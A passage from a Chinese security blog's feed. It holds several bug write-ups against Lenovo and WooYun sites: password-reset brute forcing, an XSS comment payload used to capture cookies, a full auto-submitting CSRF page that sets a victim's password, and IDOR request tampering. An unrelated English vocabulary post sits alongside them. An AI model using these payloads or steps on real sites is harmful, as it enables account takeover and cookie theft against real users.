src="http://static.zybuluo.com/1kbfree/lt5h3qshb72za5e0kxbxf96s/image_1cg3omtmar5i1hv3meu1jmf1lgo5o.png" alt="image_1cg3omtmar5i1hv3meu1jmf1lgo5o.png-30.9kB"></p><p><em>这边密码爆破任意用户密码重置，因为之前我遍历了所有用户的信息包括手机号，这个可以配合一下直接重置任意用户咯，这里不做破坏就拿自己的来</em></p><p><img src="http://static.zybuluo.com/1kbfree/pze70o5bwsyjed2igr68on9a/image_1cg3oqb6i7nr6131ucf18k21qnh65.png" alt="image_1cg3oqb6i7nr6131ucf18k21qnh65.png-578.3kB"></p><p><em>虽然验证码是6位数的，但是60分钟应该够了</em></p><p><img src="http://static.zybuluo.com/1kbfree/26jig70v1s3sxp1bmksur1e4/image_1cg3or0iosjspdm1nh1151875q6i.png" alt="image_1cg3or0iosjspdm1nh1151875q6i.png-79kB"></p><h3 id="转载者想说的话"><a href="#转载者想说的话" class="headerlink" title="转载者想说的话"></a>转载者想说的话</h3><p>mmp，这个文章是我转载最难转载的一篇，没有之一，其中原因不多说，原文地址:<code>http://wy.daochuan.net/bug_detail.php?wybug_id=wooyun-2016-0198593</code></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;危害：看文章自己脑补&lt;br&gt;漏洞等级：高&lt;br&gt;提交时间：   2016-04-20 18:15&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="乌云历史文章" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="支付漏洞" scheme="127.0.0.1/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Xss漏洞" scheme="127.0.0.1/tags/Xss%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="密码逻辑漏洞" scheme="127.0.0.1/tags/%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>乌云某处逻辑错误导致越权</title>
    <link href="127.0.0.1/2018/06/15/%E4%B9%8C%E4%BA%91%E6%9F%90%E5%A4%84%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E8%B6%8A%E6%9D%83/"/>
    <id>127.0.0.1/2018/06/15/乌云某处逻辑错误导致越权/</id>
    <published>2018-06-15T15:08:04.000Z</published>
    <updated>2018-06-15T16:12:52.214Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）<br>漏洞等级：低危<br>提交时间：   2016-06-23 12:05</p></blockquote><a id="more"></a><ul><li>打开漏洞后，点击“给漏洞作者发送礼物”，通过抓包即可得到含有该漏洞提交者的whitehatid，相应链接为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111</span><br></pre></td></tr></table></figure><ul><li><p>id为1的厂商向whitehatid为11111的白帽子发送礼物接收提醒，因此提交此漏洞的白帽子whitehatid为11111.</p></li><li><p>在获取到白帽子的whitehatid后，只需找到一个地方能够对应到白帽子的乌云id即可；</p></li><li><p>可能获知whitehatid<->白帽子id的对应方法还有其他的，这里我仅用了下面这个来实现。</-></p></li><li><p>访问以下链接，向该白帽子索取联系方式（但无需白帽子确认）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=contactwhitehat&amp;whitehatid=11111</span><br></pre></td></tr></table></figure></li><li><p>接着继续访问以下链接提醒白帽子接收礼物</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.wooyun.org/actdo.php?action=sms&amp;do=giftremind&amp;corpid=1&amp;whitehatid=11111</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>经测试发现，只要厂商曾经尝试索取白帽子联系方式后（不管是否成功获取），再提醒白帽子接收礼物，即可在厂商信息主页处看到给<em>**</em>发送礼物，此时白帽子的乌云ID就出来了。</p></blockquote><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;危害：厂商可查看所有自家漏洞提交者的乌云ID（包括路人甲）&lt;br&gt;漏洞等级：低危&lt;br&gt;提交时间：   2016-06-23 12:05&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="乌云历史文章" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="权限失控" scheme="127.0.0.1/tags/%E6%9D%83%E9%99%90%E5%A4%B1%E6%8E%A7/"/>
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验之联想游戏论坛存在&quot;奇异&quot;反射Xss</title>
    <link href="127.0.0.1/2018/06/15/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E6%B8%B8%E6%88%8F%E8%AE%BA%E5%9D%9B%E5%AD%98%E5%9C%A8%E5%A5%87%E5%BC%82%E5%8F%8D%E5%B0%84Xss/"/>
    <id>127.0.0.1/2018/06/15/漏洞挖掘经验之联想游戏论坛存在奇异反射Xss/</id>
    <published>2018-06-15T08:51:53.000Z</published>
    <updated>2018-06-21T15:52:27.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止外泄!</p></blockquote><a id="more"></a><p>漏洞URL : <a href="http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153" target="_blank" rel="noopener">http://bbs.lenovogame.com/bbs/common/topic/index.do?id=69153</a></p><h5 id="0-我们开始打开漏洞的地址"><a href="#0-我们开始打开漏洞的地址" class="headerlink" title="0. 我们开始打开漏洞的地址"></a>0. 我们开始打开漏洞的地址</h5><p>这里是需要登录或者注册，到时候自己注册登录一下就可以看到如下这个界面了。  </p><p><img src="http://static.zybuluo.com/1kbfree/5q1rnqzod7l0u5w880tr4138/image_1cg1akgfq3mgi991adhp1e1jji2h.png" alt="image_1cg1akgfq3mgi991adhp1e1jji2h.png-80kB"></p><h5 id="1-插入Xss代码"><a href="#1-插入Xss代码" class="headerlink" title="1. 插入Xss代码"></a>1. 插入Xss代码</h5><p>在帖子的评论区域插入代码<code>&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</code>,如图</p><p><img src="http://static.zybuluo.com/1kbfree/kiux3cmbuucemw9bgh5d8s9v/xss1.png" alt="xss1.png-56.2kB"></p><blockquote><p>说实话也是运气好，我这段代码很早以前就插进去了，在电脑版的网页中，没有弹窗，但换到手机版本却有奇效（大家一定要多多测试，不要漏掉每一个细节）  </p></blockquote><h5 id="2-打开帖子查看"><a href="#2-打开帖子查看" class="headerlink" title="2. 打开帖子查看"></a>2. 打开帖子查看</h5><p><img src="http://static.zybuluo.com/1kbfree/qdc1a2tlhck7lwmbxosmlvyo/xss2.png" alt="xss2.png"></p><p><em>点击帖子处后可以看到下图的效果</em></p><p><img src="http://static.zybuluo.com/1kbfree/h2enlt4rez4ndtcmbxm1i43u/xss3.png" alt="xss3.png"></p><p><em>可以看到这里已经弹窗了，那么我们再深入利用一下</em></p><p><img src="http://static.zybuluo.com/1kbfree/2gw9k41an74d6tca2j09mmkl/xss4.png" alt="xss4.png-48.2kB"></p><h5 id="3-接着查看下是否有接受到Cookie"><a href="#3-接着查看下是否有接受到Cookie" class="headerlink" title="3. 接着查看下是否有接受到Cookie"></a>3. 接着查看下是否有接受到<code>Cookie</code></h5><p><img src="http://static.zybuluo.com/1kbfree/vhuxoy6or7ts6uzyva6wgo5x/xss5.png" alt="xss5.png-221.7kB"></p><p><em>成功获取到<code>Cookie</code>，说明是存在<code>Xss</code>的</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部文章，禁止外泄!&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="作者：一条快乐的咸鱼" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/%E4%BD%9C%E8%80%85%EF%BC%9A%E4%B8%80%E6%9D%A1%E5%BF%AB%E4%B9%90%E7%9A%84%E5%92%B8%E9%B1%BC/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="Xss漏洞" scheme="127.0.0.1/tags/Xss%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验之联想E采存在Csrf漏洞</title>
    <link href="127.0.0.1/2018/06/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E8%81%94%E6%83%B3E%E9%87%87%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/14/漏洞挖掘之联想E采存在Csrf漏洞/</id>
    <published>2018-06-14T15:27:24.000Z</published>
    <updated>2018-06-14T16:02:43.105Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部资料，禁止外泄!</p></blockquote><div class="note info"><p>危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~</p></div><a id="more"></a><h5 id="先注册两个账号，邮箱分别为-clickjacking-126-com-和-623425849-qq-com-其中-623425849-qq-com-的密码为-12345678aa"><a href="#先注册两个账号，邮箱分别为-clickjacking-126-com-和-623425849-qq-com-其中-623425849-qq-com-的密码为-12345678aa" class="headerlink" title="先注册两个账号，邮箱分别为 clickjacking@126.com 和 623425849@qq.com,其中 623425849@qq.com 的密码为 12345678aa"></a>先注册两个账号，邮箱分别为 <code>clickjacking@126.com</code> 和 <code>623425849@qq.com</code>,其中 <code>623425849@qq.com</code> 的密码为 <code>12345678aa</code></h5><h5 id="这里都按照正常流程操作-在忘记密码处输入用户名clickjacking-126-com"><a href="#这里都按照正常流程操作-在忘记密码处输入用户名clickjacking-126-com" class="headerlink" title="这里都按照正常流程操作,在忘记密码处输入用户名clickjacking@126.com"></a>这里都按照正常流程操作,在忘记密码处输入用户名<code>clickjacking@126.com</code></h5><p><img src="http://static.zybuluo.com/1kbfree/976m79f968l4kpmyxo0ddkil/csrf1.png" alt="csrf1.png-150.5kB"></p><h5 id="点下一步，输入邮箱发送过来的验证码"><a href="#点下一步，输入邮箱发送过来的验证码" class="headerlink" title="点下一步，输入邮箱发送过来的验证码."></a>点下一步，输入邮箱发送过来的验证码.</h5><p><img src="http://static.zybuluo.com/1kbfree/3dz32xyw0zcjrjwh6knhly5c/csrf2.png" alt="csrf2.png">  </p><h5 id="点下一步，输入新密码，抓包"><a href="#点下一步，输入新密码，抓包" class="headerlink" title="点下一步，输入新密码，抓包."></a>点下一步，输入新密码，抓包.</h5><p><img src="http://static.zybuluo.com/1kbfree/wuzoww8knv8h3te4v9om6dxl/csrf3.png" alt="csrf3.png-62kB"> </p><h5 id="将数据包制作成Csrf-Poc，如下"><a href="#将数据包制作成Csrf-Poc，如下" class="headerlink" title="将数据包制作成Csrf Poc，如下"></a>将数据包制作成Csrf Poc，如下</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> <span class="attr">name</span>=<span class="string">"px"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://vip.lenovo.com.cn/Account/ForgotPassword/UpdateForgotPassword"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"newPassword1"</span> <span class="attr">value</span>=<span class="string">"123456789aa&amp;#126;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"newPassword2"</span> <span class="attr">value</span>=<span class="string">"123456789aa&amp;#126;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"next"</span> <span class="attr">value</span>=<span class="string">"�&amp;#184;&amp;#139;�&amp;#184;&amp;#128;�&amp;#173;&amp;#165;"</span> /&gt;</span><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">document.px.submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="浏览器处打开html文件"><a href="#浏览器处打开html文件" class="headerlink" title="浏览器处打开html文件"></a>浏览器处打开html文件</h5><p><img src="http://static.zybuluo.com/1kbfree/jmb40prydeckzzz68mi2emir/csrf5.png" alt="csrf5.png-180.1kB"></p><h5 id="我们再输入原先的密码"><a href="#我们再输入原先的密码" class="headerlink" title="我们再输入原先的密码"></a>我们再输入原先的密码</h5><p><img src="http://static.zybuluo.com/1kbfree/po891mq5w5wh1gu86q811og9/csrf6.png" alt="csrf6.png-196.3kB"></p><p><em>可以看到是失败的</em></p><h5 id="输入新密码123456789aa"><a href="#输入新密码123456789aa" class="headerlink" title="输入新密码123456789aa~"></a>输入新密码123456789aa~</h5><p><img src="http://static.zybuluo.com/1kbfree/3ohrv1nmjq76k7nj6lc2wkjv/csrf7.png" alt="csrf7.png-90.6kB"></p><p><img src="http://static.zybuluo.com/1kbfree/tdsqvah6m2ux655zitc0olnz/csrf8.png" alt="csrf8.png-88.5kB"></p><p><em>发现可以登录，说明<code>Csrf</code>漏洞利用成功</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部资料，禁止外泄!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;note info&quot;&gt;&lt;p&gt;危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~&lt;/p&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="逻辑漏洞" scheme="127.0.0.1/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Csrf漏洞" scheme="127.0.0.1/tags/Csrf%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验之联想两处越权漏洞</title>
    <link href="127.0.0.1/2018/06/13/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E4%B8%A4%E5%A4%84%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/13/漏洞挖掘经验之联想两处越权漏洞/</id>
    <published>2018-06-13T11:52:02.000Z</published>
    <updated>2018-06-21T16:09:28.064Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部资料，禁止外泄！</p></blockquote><a id="more"></a><blockquote><p>漏洞Url：<a href="https://moc.lenovo.com" target="_blank" rel="noopener">https://moc.lenovo.com</a></p></blockquote><h3 id="联想某企业网站解散企业处越权漏洞"><a href="#联想某企业网站解散企业处越权漏洞" class="headerlink" title="联想某企业网站解散企业处越权漏洞"></a>联想某企业网站解散企业处越权漏洞</h3><h4 id="1-创建两个企业号，id分别为"><a href="#1-创建两个企业号，id分别为" class="headerlink" title="1. 创建两个企业号，id分别为"></a>1. 创建两个企业号，id分别为</h4><p>100645 and 100643</p><h4 id="2-打开url：https-moc-lenovo-com-moc-home-settings-do"><a href="#2-打开url：https-moc-lenovo-com-moc-home-settings-do" class="headerlink" title="2. 打开url：https://moc.lenovo.com/moc/home_settings.do"></a>2. 打开url：<a href="https://moc.lenovo.com/moc/home_settings.do" target="_blank" rel="noopener">https://moc.lenovo.com/moc/home_settings.do</a></h4><h4 id="3-点击解散企业"><a href="#3-点击解散企业" class="headerlink" title="3. 点击解散企业"></a>3. 点击解散企业</h4><p><img src="http://static.zybuluo.com/1kbfree/oa9zmjedsoiiorvkt99s3ltr/image_1cfsfh2dt176h1pn2sld6i9o7b9.png" alt="image_1cfsfh2dt176h1pn2sld6i9o7b9.png-83.5kB"></p><h4 id="4-在二次验证界面输入当前账号的密码并抓包"><a href="#4-在二次验证界面输入当前账号的密码并抓包" class="headerlink" title="4.在二次验证界面输入当前账号的密码并抓包"></a>4.在二次验证界面输入当前账号的密码并抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/wpbk7mxo2715g9t9sgizszin/image_1cfsfi6am5vevellgr111odu0m.png" alt="image_1cfsfi6am5vevellgr111odu0m.png-103.9kB"></p><h4 id="5-找到这个数据包，当前企业id为100643，将其改为100645"><a href="#5-找到这个数据包，当前企业id为100643，将其改为100645" class="headerlink" title="5.找到这个数据包，当前企业id为100643，将其改为100645."></a>5.找到这个数据包，当前企业id为100643，将其改为100645.</h4><p><img src="http://static.zybuluo.com/1kbfree/pi1pl028cqes8naw9k2vbiua/image_1cfsfit595029i01t8015nj14eg13.png" alt="image_1cfsfit595029i01t8015nj14eg13.png-138.4kB"></p><h4 id="6-发送成功"><a href="#6-发送成功" class="headerlink" title="6.发送成功"></a>6.发送成功</h4><p><img src="http://static.zybuluo.com/1kbfree/mxyejrecxwn3ng1m6cpf6lnn/image_1cfsfj5tc1579f9bcriluf1ac61g.png" alt="image_1cfsfj5tc1579f9bcriluf1ac61g.png-47.1kB"></p><h4 id="7-刚才id为100645的企业已被解散"><a href="#7-刚才id为100645的企业已被解散" class="headerlink" title="7.刚才id为100645的企业已被解散"></a>7.刚才id为100645的企业已被解散</h4><p><img src="http://static.zybuluo.com/1kbfree/sm2fy5bsv1ndgc3j6svaoos9/image_1cfsfjsk3a6e74psb619di1vdd1t.png" alt="image_1cfsfjsk3a6e74psb619di1vdd1t.png-701.3kB"></p><h3 id="创建企业处越权漏洞"><a href="#创建企业处越权漏洞" class="headerlink" title="创建企业处越权漏洞"></a>创建企业处越权漏洞</h3><blockquote><p>漏洞url/位置：<br><a href="https://moc.lenovo.com/moc/home_login_callback.do" target="_blank" rel="noopener">https://moc.lenovo.com/moc/home_login_callback.do</a></p></blockquote><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><h5 id="1-创建两个账户，都不先不选择创建企业。"><a href="#1-创建两个账户，都不先不选择创建企业。" class="headerlink" title="1.创建两个账户，都不先不选择创建企业。"></a>1.创建两个账户，都不先不选择创建企业。</h5><h5 id="2-选择任一账户，点击创建企业："><a href="#2-选择任一账户，点击创建企业：" class="headerlink" title="2.选择任一账户，点击创建企业："></a>2.选择任一账户，点击创建企业：</h5><p><img src="http://static.zybuluo.com/1kbfree/d6k35h9m5saj9tu97dctcqlb/image_1cfsfm8b7om616ul158v1vku2qo2q.png" alt="image_1cfsfm8b7om616ul158v1vku2qo2q.png-115.8kB"></p><h5 id="3-此时抓包，数据包中有一个staff-login值，此时为13开头的账户，将其改为另外一个账户的账号："><a href="#3-此时抓包，数据包中有一个staff-login值，此时为13开头的账户，将其改为另外一个账户的账号：" class="headerlink" title="3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号："></a>3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号：</h5><p><img src="http://static.zybuluo.com/1kbfree/2kd8ys0gwz2ydbb5egxirj31/image_1cfsfnas31mu8163o1ljkjhn9og37.png" alt="image_1cfsfnas31mu8163o1ljkjhn9og37.png-262.6kB"></p><h5 id="4-发送成功，回显success"><a href="#4-发送成功，回显success" class="headerlink" title="4.发送成功，回显success"></a>4.发送成功，回显success</h5><p><img src="http://static.zybuluo.com/1kbfree/85pouzgb8f20xb43wkbxppdn/image_1cfsfnjikvvr1p2q92fsm4e533k.png" alt="image_1cfsfnjikvvr1p2q92fsm4e533k.png-27.8kB"></p><h5 id="5-登陆到另一个账户中，发现果然创建成功"><a href="#5-登陆到另一个账户中，发现果然创建成功" class="headerlink" title="5.登陆到另一个账户中，发现果然创建成功"></a>5.登陆到另一个账户中，发现果然创建成功</h5><p><img src="http://static.zybuluo.com/1kbfree/6ejbg8nl37l87b07j1gtr9kn/image_1cfsfnqpc72p1p5g1cephkm12b141.png" alt="image_1cfsfnqpc72p1p5g1cephkm12b141.png-35.9kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部资料，禁止外泄！&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="作者：逗逗" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/%E4%BD%9C%E8%80%85%EF%BC%9A%E9%80%97%E9%80%97/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/tags/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>英语词汇学习</title>
    <link href="127.0.0.1/2018/06/07/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87%E5%AD%A6%E4%B9%A0/"/>
    <id>127.0.0.1/2018/06/07/英语词汇学习/</id>
    <published>2018-06-07T15:48:22.000Z</published>
    <updated>2018-06-11T13:09:56.828Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~</p></blockquote><a id="more"></a><h3 id="back"><a href="#back" class="headerlink" title="back"></a>back</h3><p>中文:后背<br>读音:ba(第四声)可</p><h3 id="bake"><a href="#bake" class="headerlink" title="bake"></a>bake</h3><p>中文:烘焙<br>读音:bei(第四声)可</p><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>中文:容易<br>读音:衣ji</p><h3 id="strong"><a href="#strong" class="headerlink" title="strong"></a>strong</h3><p>中文:强壮<br>读音:死状</p><h3 id="fee"><a href="#fee" class="headerlink" title="fee"></a>fee</h3><p>中文:费用<br>读音:fei(四)</p><h3 id="fly"><a href="#fly" class="headerlink" title="fly"></a>fly</h3><p>中文:飞<br>读音:福来<br>句子( 加深记忆 ):他的<strong>福</strong>气是 <em>飞</em> 过<strong>来</strong>的</p><h3 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h3><p>中文:离开<br>读音:离(四)唔</p><h3 id="sleeve"><a href="#sleeve" class="headerlink" title="sleeve"></a>sleeve</h3><p>中文:袖子<br>读音:使力舞</p><blockquote><p><code>leave</code>和<code>sleeve</code>造句：<br>悄悄的我leave(走了),正如我悄悄的来<br>我挥一挥sleeve(衣袖),不带走一片云彩</p></blockquote><h3 id="drag"><a href="#drag" class="headerlink" title="drag"></a>drag</h3><p>中文:拖、拽<br>读音：拽胳</p><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>中文：推<br>读音：怕使<br>图解：<img src="http://static.zybuluo.com/1kbfree/vyxzdviwmjaojm86av6axjko/image_1cfded7as1sro14rgf8r1j19hmr9.png" alt="image_1cfded7as1sro14rgf8r1j19hmr9.png-41.4kB"></p><h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p>中文：拉<br>读音：po(四)<br>图解:<img src="http://static.zybuluo.com/1kbfree/whpxujlqnfq7awawvkaikval/image_1cfdefsm61dod14hn3vuuqt1em946.png" alt="image_1cfdefsm61dod14hn3vuuqt1em946.png-42.8kB"></p><h3 id="chart"><a href="#chart" class="headerlink" title="chart"></a>chart</h3><p>中文：图纸<br>读音：插纸</p><h3 id="cruel"><a href="#cruel" class="headerlink" title="cruel"></a>cruel</h3><p>中文：残酷<br>读音：哭咯<br>句子：因为现实很 <strong>残酷</strong> 所以他 <strong>哭咯</strong></p><h3 id="debt"><a href="#debt" class="headerlink" title="debt"></a>debt</h3><p>中文：债务<br>读音：贷te<br>句子：他欠了债务，所以有很多贷te等他还</p><h3 id="rude"><a href="#rude" class="headerlink" title="rude"></a>rude</h3><p>中文：粗鲁，无礼<br>读音：入的<br>句子：他不敲门就进 <strong>入</strong> 我的房间，这很 <strong>粗鲁</strong> ，很无礼</p><h3 id="fine"><a href="#fine" class="headerlink" title="fine"></a>fine</h3><p>中文: 好的 n.罚款<br>读音：fai(四)<br>句子：罚款只是为了你变 <strong>fine</strong>(好的)</p><h3 id="finance"><a href="#finance" class="headerlink" title="finance"></a>finance</h3><p>中文：金融<br>读音：犯难事<br>句子：金融方面遇到了问题，所以我犯难事</p><h3 id="deliver"><a href="#deliver" class="headerlink" title="deliver"></a>deliver</h3><p>中文：递送 分娩 发言<br>读音：递里我<br>句子：</p><ol><li>交出一个东西-&gt;递送</li><li>交出一个孩子-&gt;分娩</li><li>交出一个意见-&gt;发言</li></ol><h3 id="mud"><a href="#mud" class="headerlink" title="mud"></a>mud</h3><p>中文：泥<br>读音：骂的<br>句子：我浑身是泥，所以我给家长<strong>骂的</strong>哭了</p><h3 id="pet"><a href="#pet" class="headerlink" title="pet"></a>pet</h3><p>中文：宠物<br>读音：陪(四)它<br>句子：我养了一只宠物，我天天陪它</p><h3 id="pest"><a href="#pest" class="headerlink" title="pest"></a>pest</h3><p>中文：害虫<br>读音：拍死他<br>句子：这个害虫有毒，我要拍死他</p><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><p>中文：礼物<br>读音：给(四)福特<br>句子：他礼物是给福特的</p><h3 id="respond"><a href="#respond" class="headerlink" 